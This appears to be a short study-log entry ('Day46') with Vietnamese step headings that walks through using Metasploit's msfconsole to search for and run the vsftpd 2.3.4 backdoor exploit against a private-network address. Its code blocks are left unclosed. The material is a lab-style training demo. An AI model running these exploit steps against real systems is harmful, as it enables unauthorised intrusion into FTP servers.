# Day46: Metasploit Framework Demo

## Bước 1: Mở msfconsole
```bash
msfconsole

## Bước 2: Tìm exploit
```bash
search vsftpd

## Bước 3: Chọn exploit
```bash
use exploit/unix/ftp/vsftpd_234_backdoor

## Bước 4: Đặt target
```bash
set RHOST 192.168.1.10

## Bước 5: Chạy exploit
```bash
run 
